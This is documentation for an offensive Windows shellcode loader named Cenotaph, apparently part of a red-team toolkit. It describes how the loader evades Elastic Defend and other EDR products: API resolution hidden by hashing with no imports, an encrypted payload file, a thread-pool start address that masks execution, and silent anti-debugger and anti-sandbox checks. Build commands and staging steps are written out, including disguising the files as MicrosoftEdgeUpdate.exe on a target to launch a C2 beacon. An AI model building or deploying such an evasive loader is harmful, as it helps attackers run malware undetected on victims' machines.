# Cenotaph — Tool Documentation

> **EDR-fit disk fallback shellcode loader.** A small native x64 Windows PE
> that launches an encrypted x64 shellcode payload from a sibling file on disk.
> Built for **Elastic Defend** (kernel ETW-TI feed) and as a generic fallback
> when in-memory injection is blocked or noisy.
>
> **Status:** BUILD-GREEN, audit-clean, disasm-verified. Encrypted payload
> roundtrip verified in Python. Live Windows validation: pending (see §11).

---

## 1. Overview

Cenotaph is a small (~7 KB) native x64 Windows PE that acts as a **simple,
OPSEC-safe, disk-based fallback loader** for any x64 PIC shellcode. The payload
file on disk is encrypted with **ChaCha20 + HMAC-SHA256**, and the symmetric key
is XOR-obfuscated inside the binary. The loader itself has **zero imports**, uses
**no CRT**, resolves every API via a PEB walk with FNV1a-32 hashes, and runs the
payload from an RX allocation through a thread-pool worker whose start address
is `ntdll!TppWorkerThread`.

```
cenotaph.exe
  │  1. PEB-walk every functional API via compile-time FNV1a hashes (no name strings)
  │  2. Silent fail-closed anti-analysis checks (§8)
  │  3. Build the path to sibling <exe-stem>.dat
  │  4. Read encrypted payload (CreateFileW / ReadFile / GetFileSizeEx)
  │  5. Verify HMAC-SHA256 over nonce || ciphertext; wrong → bail
  │  6. ChaCha20-IETF decrypt into an RW buffer (counter starts at 1)
  │  7. NtAllocateVirtualMemory RW → NtProtectVirtualMemory RX (never RWX)
  │  8. TpAllocWork(callback=payload)/TpPostWork/TpReleaseWork
  │      worker start address = ntdll!TppWorkerThread
  │  9. NtDelayExecution(INFINITE) on main thread
  ▼
x64 shellcode / beacon
```

The loader is payload-agnostic. Encrypt `nax.x64.bin` to launch the NaX beacon,
or encrypt any other x64 PIC shellcode. The payload's C2/keys/URL are baked into
the shellcode itself; Cenotaph only decrypts and runs it.

---

## 2. Design posture

Cenotaph is designed for **EDR environments that feed on kernel ETW-Threat-
Intelligence (ETW-TI)** plus image/behavior analytics, not userland `ntdll`
hooks. Its posture follows from that:

- **Zero IAT imports.** The binary has **no import table entries at all**. Every
  API is resolved at runtime by walking `InLoadOrderModuleList` and matching
  compile-time FNV1a-32 hashes of export names.
- **No API name strings.** All API names are compile-time FNV1a immediates.
- **ntdll syscalls via their own wrappers.** `Nt*` routines are called through the
  PEB-resolved function pointers inside `ntdll` itself, so the `syscall`
  instruction's RIP stays within `ntdll`'s `.text`.
- **Encrypted payload on disk.** The `.dat` file is `nonce(12) || ciphertext ||
  hmac(32)`. HMAC is computed over `nonce || ciphertext`. Wrong HMAC = decrypt
  is never attempted.
- **No RWX.** Payload memory is allocated `PAGE_READWRITE`, decrypted into it, then
  flipped `PAGE_EXECUTE_READ`.
- **No AMSI / ETW patching.**
- **In-process execution, thread-pool hand-off.** Payload runs in-process on a
  pool worker whose start address is `ntdll!TppWorkerThread`, not the private
  RX buffer. No child process is spawned.
- **Fail-closed anti-analysis.** Silent exit on debugger, heap flags, low CPU,
  low uptime, or timing anomalies.
- **Embedded key is XOR-obfuscated with a single byte.** The raw key is never
  stored contiguously in the binary.

---

## 3. Repository layout

```
Cenotaph/
├── include/
│   ├── Cenotaph.h      types, hash constants, full x64 PEB/LDR structs, INSTANCE
│   ├── CenKey.h        generated embedded key placeholder (regenerate before staging)
│   └── Constexpr.h     compile-time FNV1a (HASH_STR -> immediate, no name strings)
├── src/
│   ├── Ldr.c           PEB walk + export-table resolution (adapted from NaX)
│   ├── Utils.c         FNV1a-32 HashString (verbatim NaX logic — load-bearing)
│   └── Host.c          entry: resolve → sandbox → read → verify → decrypt → RX → run
├── scripts/
│   └── validate.py     static scanner (zero imports, API strings, RWX, undefineds)
├── tools/
│   ├── hash.py         FNV1a verifier (reproduces every constant Cenotaph uses)
│   └── encrypt.py      encrypt a payload + generate CenKey.h
├── Makefile            mingw cross-build + `make audit`
├── .gitignore
└── README.md           quickstart
```

---

## 4. Encrypted payload format

The on-disk `.dat` file:

| Field | Size | Description |
|---|---|---|
| nonce | 12 bytes | ChaCha20 IETF nonce (random per file) |
| ciphertext | `N` bytes | ChaCha20-IETF stream cipher of the raw x64 shellcode |
| hmac | 32 bytes | HMAC-SHA256 over `nonce \|\| ciphertext` |

The format is parsed by `CenReadPayload()` and verified by `CenRunPayload()`:

1. Total size must be `≥ 44` bytes and `≤ 8 MB`.
2. Compute `HMAC-SHA256(key, nonce || ciphertext)`.
3. Constant-time compare against the trailing 32 bytes.
4. If valid, decrypt with ChaCha20-IETF, counter starting at `1`.

The 32-byte key and single obfuscation byte are stored in `include/CenKey.h` as
`EKEY[32]` and `CEN_OBF_BYTE`. At runtime, `CenDeobfuscateKey()` XORs every byte
of `EKEY` with the obfuscation byte to recover the real ChaCha20/HMAC key.

### 4.1 Generating a payload

```bash
python3 tools/encrypt.py --payload nax.x64.bin --dat cenotaph.dat \
                         --header include/CenKey.h
```

This:
1. Generates a random 32-byte key and random 1-byte obfuscator.
2. Writes `CenKey.h` with XOR-obfuscated `EKEY[32]` and `CEN_OBF_BYTE`.
3. Encrypts the payload and writes `cenotaph.dat` in the format above.

To encrypt another payload with the **same** key (after the first run):

```bash
python3 tools/encrypt.py --payload other.x64.bin --dat other.dat --keep-header
```

The real key and `.dat` payload files are **never committed** (`.gitignore`).
`include/CenKey.h` ships as a placeholder all-zero key so the repo builds out of
the box, but you must regenerate it before any real staging.

---

## 5. Build

Cross-compiled on Linux with mingw-w64 (`x86_64-w64-mingw32-g++`).

```bash
make            # cenotaph.exe       (release, windows subsystem, stripped, ~7 KB)
make debug      # cenotaph-debug.exe (console subsystem, sandbox check disabled)
make audit      # zero-import + API-string + undefined-symbol + entry-point checks
make key        # regenerate CenKey.h (alias for encrypt.py without payload)
make clean
```

No CRT is linked (`-nostdlib`, explicit entry `CenotaphEntry`). **No import libs
are linked at all** (`-lkernel32` removed in v2). Every API is resolved at
runtime via the PEB walk.

### 5.1 Prerequisites

- `x86_64-w64-mingw32-g++` (mingw-w64)
- `x86_64-w64-mingw32-strip`, `-objcopy`, `-nm`, `-readelf` (ships with mingw-w64)
- host `binutils` for `strings`, `objdump`
- Python 3 with `cryptography` (for `tools/encrypt.py`)

### 5.2 Key flags

| Flag | Purpose |
|---|---|
| `-Os` | small binary |
| `-nostdlib` | no CRT — bare native PE |
| no `-lkernel32` | zero imports |
| `-Wl,-e,CenotaphEntry` | explicit entry (no CRT main) |
| `-fno-exceptions -fno-rtti -fno-ident` | strip C++ runtime baggage / identity |
| `-fno-asynchronous-unwind-tables` | no `.pdata`/`.xdata` bloat in the host |
| `-Wl,-subsystem,windows` (release) | no console window |
| `-Wl,-subsystem,console` (debug) | stdout visible for testing |
| `-fpermissive` | void*↔typed* casts in `Ldr.c` |
| `-Wl,--no-seh` | no SafeSEH (bare PE) |
| `-Wl,--disable-runtime-pseudo-reloc` | no pseudo-reloc section |
| `-static-libgcc -static-libstdc++` | avoid dynamic CRT dependencies |

C++ (not C) is used so `HASH_STR` evaluates FNV1a at **compile time** via
`constexpr` — the hashes become immediates in the disasm, never strings.

---

## 6. Module reference

### 6.1 `include/Constexpr.h` — compile-time FNV1a
- `HASH_STR("NtAllocateVirtualMemory")` → a `constexpr ULONG` immediate.
- FNV1a-32, case-insensitive (uppercased before hashing), seed `0x811c9dc5`,
  prime `0x01000193` — byte-identical to NaX.

### 6.2 `include/Cenotaph.h` — types & INSTANCE
- `CEN_PEB` / `CEN_PEB_LDR_DATA` / `CEN_LDR_DATA_TABLE_ENTRY` — **full** x64
  layouts (mingw `<winternl.h>` ships only partial structs). `DllBase` @ +0x30,
  `BaseDllName` @ +0x58.
- `CenPeb()` via `__readgsqword(0x60)` — no API call to get the PEB.
- `CEN_INSTANCE g_Inst` (`.bss`) — every PEB-walked API pointer + module bases.
- `PFN_*` typedefs for all resolved APIs, including `NtClose`,
  `NtDelayExecution`, `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`,
  `NtQuerySystemInformation`, `TpAllocWork`, `TpPostWork`, `TpReleaseWork`,
  `CreateFileW`, `ReadFile`, `GetFileSizeEx`, `GetModuleFileNameW`.
- `CEN_SYS_BASIC` for `NtQuerySystemInformation(SystemBasicInformation)` and
  `CEN_TIMEOFDAY_INFO` for `SystemTimeOfDayInformation`.

### 6.3 `include/CenKey.h` — embedded key
- `EKEY[32]` — XOR-obfuscated ChaCha20/HMAC key.
- `CEN_OBF_BYTE` — single-byte XOR mask.
- Regenerate with `tools/encrypt.py` before real use. The repo ships a
  placeholder zero key.

### 6.4 `src/Utils.c` — `HashString` (FNV1a-32)
Byte-for-byte from NaX. The `if(!*Ptr) ++Ptr;` (no `continue`) +
`U_PTR(U_PTR(Ptr)-U_PTR(String))` tail is load-bearing — a "cleaner" rewrite
produces wrong hashes. Verify with `tools/hash.py` before editing this function.

### 6.5 `src/Ldr.c` — PEB walk + export resolution
- `LdrModulePeb(Hash)` — walk `InLoadOrderModuleList` by FNV1a of
  `BaseDllName.Buffer`/`Length`; return `DllBase`.
- `LdrFunction(Library, Function)` — parse the export directory, match by hash,
  resolve forwarded exports recursively (`LdrpFwdResolve`).
- Adapted from NaX `src_loader/src/Ldr.c`.

### 6.6 `src/Host.c` — entry point `CenotaphEntry`
1. `CenResolve()` — PEB-walk all APIs into `g_Inst`; fail-closed if any missing.
2. `CenSandboxOk()` — debugger, heap flags, CPU count, uptime, RDTSC (§8).
3. `CenBuildPayloadPath()` — `GetModuleFileNameW` → derive `<exe-dir>\<exe-stem>.dat`.
4. `CenReadPayload()` — `CreateFileW` + `GetFileSizeEx` + `NtAllocateVirtualMemory`
   (RW) + `ReadFile`; 8 MB cap; fail-closed.
5. `CenRunPayload()`:
   - Extract `nonce || ciphertext || hmac`.
   - Compute and verify HMAC-SHA256.
   - ChaCha20 decrypt.
   - `NtProtectVirtualMemory` → **RX**.
   - `TpAllocWork(callback=payload)` + `TpPostWork` + `TpReleaseWork`.
   - Direct-call fallback if pool allocation fails.
6. `NtDelayExecution(INFINITE)` — keep the process alive while the payload runs.

Tiny libc replacements in `Host.c`: `CenMemSet`, `CenMemCpy`, `CenMemCmp`.
Full inline crypto in `Host.c`: ChaCha20 block, SHA-256, HMAC-SHA256.

`___chkstk_ms` is a no-op stub: `CenotaphEntry`'s `WCHAR path[1100]` makes a
~4.3 KB stack frame that trips gcc's stack-probe call; with `-nostdlib` there is
no CRT to provide it. A no-op probe is safe on a 1 MB stack.

### 6.7 `tools/encrypt.py` — payload encryption
- `--payload` — raw x64 shellcode input.
- `--dat` — encrypted output path.
- `--header` — write `include/CenKey.h` with a fresh random key.
- `--keep-header` — reuse the existing `CenKey.h` key, only encrypt a new payload.

### 6.8 `scripts/validate.py` — static scanner
- Verifies empty import table with `objdump -p`.
- Scans for API name strings, AMSI/ETW strings, RWX strings, plaintext HTTP.
- Verifies no undefined symbols with `nm -u`.

---

## 7. Audit (`make audit`)

Five gates; all must pass before any live run.

1. **Zero imports — must be EMPTY.** `objdump -p` must show an empty import
   table.
2. **API-name string scan — must be EMPTY.**
   `strings -a cenotaph.exe | grep -iE 'NtAllocate|NtProtect|NtQuery|NtClose|NtDelay|TpAllocWork|TpPostWork|TpReleaseWork|VirtualAlloc|VirtualProtect|LoadLibrary|GetProcAddress|CreateFile|ReadFile|GetModuleFileName|GetFileSize|AmsiScan|EtwEvent|ChaCha|HMAC'`
   All APIs and crypto names are FNV1a hashes; a leaked name string is an OPSEC
   failure.
3. **Undefined symbols — empty.** `nm -u` must show nothing (no CRT, no bare libc).
4. **No RWX / suspicious strings.** `scripts/validate.py` checks for `PAGE_EXECUTE_READWRITE`,
   `http://`, `https://`, AMSI/ETW strings.
5. **Entry-point disasm.** FNV1a hashes appear as **immediates**:
   - `0x318a7963` = ntdll, `0x04a1a06a` = kernel32
   - `0xd58d5a18` `NtAllocateVirtualMemory`, `0x069ff566` `NtProtectVirtualMemory`,
     `0x37072d8a` `NtQuerySystemInformation`, `0x626981af` `TpAllocWork`,
     `0x77d8b8e6` `TpPostWork`, `0x18b7bcaf` `TpReleaseWork`,
     `0x34f76bdb` `GetModuleFileNameW`, `0x0c5f38e8` `NtClose`,
     `0x8a0e9c57` `NtDelayExecution`, …
   - `gs:0x60` PEB read in `LdrModulePeb`; `TpAllocWork`/`TpPostWork`/`TpReleaseWork`
     + `NtDelayExecution` tail.
   - `tools/hash.py` reproduces every constant.

### 7.1 Disassembling the entry point

```bash
x86_64-w64-mingw32-objdump -d --no-show-raw-insn cenotaph.exe | \
  sed -n '/<CenotaphEntry>:/,/^$/p'
x86_64-w64-mingw32-objdump -d --no-show-raw-insn --start-address=0x140001000 \
  --stop-address=0x140001049 cenotaph.exe   # LdrModulePeb: gs:0x60
```

(Adjust addresses to your build's actual RVAs — read them from `readelf -h` /
`objdump -t`.)

---

## 8. Anti-analysis

`CenSandboxOk()` (in `src/Host.c`, gated by `CENOTAPH_SANDBOX_CHECK`):

- `PEB.BeingDebugged` — debugger present ⇒ bail.
- `PEB.NtGlobalFlag` (+0xBC) — heap-trace / debug flags set ⇒ bail.
- Process-heap debug flags (+0x70, +0x74) — `HEAP_TAIL_CHECKING_ENABLED`,
  `HEAP_FREE_CHECKING_ENABLED`, `HEAP_VALIDATE_PARAMETERS` ⇒ bail.
- `NtQuerySystemInformation(SystemBasicInformation)` → `NumberOfProcessors < 2`
  ⇒ bail (likely a single-vCPU sandbox).
- `NtQuerySystemInformation(SystemTimeOfDayInformation)` → boot uptime < 10 min
  ⇒ bail.
- RDTSC timing check — `QueryPerformanceCounter`-style delta too small ⇒ bail
  (hypervisor / instrumentation pause detection).

**Fail-closed and silent**: on any failure the process returns from entry and
exits — no payload thread is spawned, no error output.

`make debug` defines `CENOTAPH_SANDBOX_CHECK=0` to exercise the full path on a
freshly-booted test VM.

Tunable constants: `CEN_MIN_CPUS` (2), `CEN_MIN_UPTIME_MS` (600000),
`CEN_MAX_PAYLOAD` (8 MB) — at the top of `src/Host.c`.

---

## 9. Security & OPSEC

- **Zero IAT imports** (audit gate 1).
- **No API name strings** in the binary (audit gate 2).
- **No RWX** — payload is RW then RX.
- **No private `syscall`, no indirect-syscall gadget** — ntdll's own wrappers.
- **No AMSI/ETW patching.**
- **No child process** — payload runs in-process on a pool worker.
- **Worker start address = `ntdll!TppWorkerThread`**, not a private allocation.
- **Encrypted payload on disk** — ChaCha20 + HMAC-SHA256, obfuscated key.
- **Fail-closed anti-analysis** — silent exit under debug / sandbox.
- The `.dat` payload is **not committed** (`.gitignore`).
- `CenKey.h` ships with a placeholder key; regenerate before real use.

---

## 10. Deploy / use

1. **Encrypt your payload:**
   ```bash
   python3 tools/encrypt.py --payload nax.x64.bin --dat cenotaph.dat \
                            --header include/CenKey.h
   ```
2. **Build Cenotaph:**
   ```bash
   make clean && make && make audit
   ```
3. **Validate statically:**
   ```bash
   python3 scripts/validate.py cenotaph.exe
   ```
4. **Stage on target:** rename the pair to a bland combination, e.g.
   `MicrosoftEdgeUpdate.exe` + `MicrosoftEdgeUpdate.dat`. Place them in the same
   directory.
5. **Run** the exe. Anti-analysis → read `.dat` → HMAC verify → ChaCha20 decrypt
   → RX allocation → thread-pool execution.

### 10.1 Using Cenotaph with non-NaX payloads

Cenotaph is payload-agnostic. Encrypt any x64 PIC shellcode:

```bash
python3 tools/encrypt.py --payload myshellcode.x64.bin --dat myapp.dat \
                         --header include/CenKey.h
make clean && make
```

Just keep the `.exe` and `.dat` filenames identical.

---

## 11. Live validation — test plan (PENDING)

The build is audit-clean and the encrypted-payload roundtrip is verified in
Python. Before claiming full EDR-fit, run this on a Windows lab VM with Elastic
Defend enrolled:

1. **Build & audit** on Linux: `make && make audit && python3 scripts/validate.py cenotaph.exe`.
2. **Encrypt** a test payload (e.g. `nax.x64.bin`) → `.dat`.
3. **Stage** `MicrosoftEdgeUpdate.exe` + `MicrosoftEdgeUpdate.dat`.
4. **Run** and observe:
   - No `e7d63d66` alert (image_indirect_call / syscall-outside-ntdll).
   - No `3046168a` alert (AMSI/ETW patch).
   - No AMSI/ETW strings in memory scan.
   - Payload executes (beacon heartbeats, or test shellcode pops calc/etc).
   - Worker start address of the payload thread = `ntdll!TppWorkerThread`
     (Process Hacker / `!uniqstack`-style walk), not the private RX buffer.
5. **Fail-closed checks:**
   - Corrupt one byte of the `.dat` ciphertext → Cenotaph exits silently
     (HMAC failure, no decrypt).
   - Corrupt one byte of the HMAC → Cenotaph exits silently.
   - Run under a debugger → exits before decrypt (BeingDebugged / NtGlobalFlag).
6. **If a detection fires**, capture the rule ID + the behaviour it named and
   append a dated entry to the repo's lessons log.

Pass criteria: zero detections, payload runs, worker start address is
`TppWorkerThread`, fail-closed checks behave as described.

---

## 12. Troubleshooting

### 12.1 "Process exits immediately on target"
- Sandbox check tripped: low CPU count, low uptime, debugger, or heap flags. Use
  `make debug` (`CENOTAPH_SANDBOX_CHECK=0`) to confirm the full path works, then
  revisit the thresholds in `src/Host.c`. Do not disable the check for production;
  lower `CEN_MIN_CPUS` only if the lab genuinely runs on 1 vCPU.
- Payload path wrong: Cenotaph looks for `<exe-stem>.dat` **next to the exe**.
  Confirm the `.dat` exists, is named exactly `<exe-stem>.dat`, and is readable.
- Payload too large: `> 8 MB` (`CEN_MAX_PAYLOAD`) → rejected.
- HMAC mismatch: the key embedded in the binary (`CenKey.h`) does not match the
  key used to encrypt the `.dat`. Regenerate both together with `tools/encrypt.py`.

### 12.2 "HMAC verify fails / payload doesn't run"
- Regenerate the key and payload as a pair:
  ```bash
  python3 tools/encrypt.py --payload nax.x64.bin --dat cenotaph.dat \
                           --header include/CenKey.h
  make clean && make
  ```
- Confirm the Python decrypt roundtrip works:
  ```bash
  python3 -c "from tools.encrypt import chacha20_ietf, hmac_sha256; ..."  # see encrypt.py
  ```

### 12.3 Link error: `cannot find entry symbol CenotaphEntry`
Entry must be `extern "C"` — C++ mangles it otherwise. Already handled in
`Host.c`; keep `extern "C"` on any new entry.

### 12.4 Link error: `undefined reference to ___chkstk_ms`
A function's frame crossed a page boundary and gcc emitted a stack-probe call.
Keep the `___chkstk_ms` no-op stub (safe for small frames on a 1 MB stack), or
shrink the offending local buffer below one page (e.g. `WCHAR path[1100]` →
`[600]`) so the probe call disappears.

### 12.5 FNV1a hashes don't match after editing `Utils.c`
`HashString` was altered. Revert to the NaX-verbatim version — the
`if(!*Ptr) ++Ptr;` (no `continue`) + `U_PTR(U_PTR(Ptr)-U_PTR(String))` tail is
load-bearing. Verify with `tools/hash.py`.

### 12.6 `make audit` finds an API-name string or non-zero IAT
A call was added with a literal name or linked import lib. All functional APIs
must be PEB-walked via compile-time hashes. Remove any `-l*` linker flags.

---

## 13. Adding a new resolved API

1. Add the `PFN_*` typedef to `include/Cenotaph.h`.
2. Add the pointer field to `CEN_INSTANCE.Api` (+ module to `Mod` if new).
3. In `CenResolve()` (`src/Host.c`): resolve via
   `LdrFunction(g_Inst.Mod.<module>, HASH_STR("<ApiName>"))` and store in `g_Inst`.
4. Add it to the fail-closed null-check at the end of `CenResolve()`.
5. Call it through `g_Inst.Api.<Name>(...)`, never a literal.
6. Add the name to the `make audit` grep list (`Makefile`) as a tripwire.
7. `make && make audit` — name-string scan + IAT must stay empty; `tools/hash.py`
   must reproduce the new hash.

---

## 14. Glossary

- **NaX fork** — hardened AdaptixC2 PIC beacon (module-stomping, thread-pool
  exec, FNV1a PEB walk). `$NAX` = its working copy.
- **Stardust loader** — the PIC loader prepended to the beacon; `nax.x64.bin` =
  `[Stardust Start][NaxHeader v2 160B][beacon][.pdata][.xdata]`; offset 0 = `Start`.
- **Module stomping** — writing the beacon over a legit loaded DLL's `.text`
  (here `chakra.dll`) so it executes from image-backed memory.
- **ETW-TI** — kernel ETW Threat Intelligence; Elastic's primary feed.
- **FNV1a-32** — the hash used for API/module resolution; case-insensitive.
- **`TppWorkerThread`** — `ntdll`'s thread-pool worker entry; using it as the
  payload thread's start address hides the private allocation.
- **ChaCha20-IETF** — the stream cipher used to encrypt the payload.
- **HMAC-SHA256** — the MAC used to verify the encrypted payload.

---

## 15. Pointers

- NaX fork wiki: `$NAX/wiki/Stardust-Loader-Guide.md`, `BeaconGate-Sleepmask.md`.
- Hash verifier: `tools/hash.py`.
- Encryption tool: `tools/encrypt.py`.
- Static scanner: `scripts/validate.py`.
- Quickstart: `README.md`.
- Design history & rejected alternatives: `docs/development.md` (local only).
